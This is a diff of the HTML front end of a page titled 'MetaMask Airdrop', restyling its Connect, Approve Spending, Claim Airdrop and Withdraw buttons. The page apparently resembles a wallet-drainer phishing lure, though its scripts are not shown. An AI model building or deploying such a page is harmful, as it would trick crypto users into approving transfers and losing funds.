@@ -4,43 +4,33 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>MetaMask Airdrop</title>
-  <style>
-    /* Simple styling for buttons */
-    button {
-      padding: 10px 20px;
-      margin: 10px;
-      font-size: 16px;
-      cursor: pointer;
-    }
-    #approveButton, #claimAirdropButton {
-      background-color: orange;
-    }
-    #connectButton {
-      background-color: #4CAF50;
-      color: white;
-    }
-    #withdrawETHButton, #withdrawTokensButton {
-      background-color: #f44336;
-      color: white;
-    }
-  </style>
+  <link rel="stylesheet" href="styles.css"> <!-- Link to external stylesheet -->
 </head>
 <body>
 
-  <h1>MetaMask Airdrop</h1>
-  
-  <!-- Buttons for actions -->
-  <button id="connectButton">Connect MetaMask</button>
-  <button id="approveButton" disabled>Approve Spending</button>
-  <button id="claimAirdropButton" disabled>Claim Airdrop</button>
-  <button id="withdrawETHButton">Withdraw ETH</button>
-  <button id="withdrawTokensButton">Withdraw Tokens</button>
+  <div class="container">
+    <h1>MetaMask Airdrop</h1>
+    
+    <!-- Buttons for actions -->
+    <button id="connectButton" class="btn">Connect MetaMask</button>
+    <button id="approveButton" class="btn" disabled>Approve Spending</button>
+    <button id="claimAirdropButton" class="btn" disabled>Claim Airdrop</button>
+    <button id="withdrawETHButton" class="btn">Withdraw ETH</button>
+    <button id="withdrawTokensButton" class="btn">Withdraw Tokens</button>
 
-  <!-- Script loading -->
+    <!-- Processing notification -->
+    <div class="processing" id="processing">Processing...</div>
+
+    <div class="footer">
+      <p>For more info, visit <a href="https://example.com" target="_blank">example.com</a></p>
+    </div>
+  </div>
+
   <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
-  <script src="app.js"></script> <!-- Your JavaScript file -->
+  <script src="script.js"></script> <!-- Your JavaScript file -->
 </body>
 </html>
+
 
 
 
